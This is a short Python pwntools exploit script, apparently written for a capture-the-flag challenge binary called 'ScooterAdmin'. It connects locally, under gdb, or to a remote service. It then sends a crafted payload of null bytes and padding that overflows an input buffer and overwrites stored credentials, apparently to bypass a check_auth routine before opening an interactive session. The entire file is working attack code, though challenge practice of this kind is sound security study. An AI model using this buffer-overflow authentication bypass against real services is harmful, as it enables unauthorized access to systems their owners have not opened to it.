#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./ScooterAdmin"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *check_auth+380
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b'\0' * 8# input
payload += b'A' * 8 * 3# buf
payload += b'\0' * 0x8 * 3# creds

p.recvuntil(":")
p.send(payload)

p.interactive()
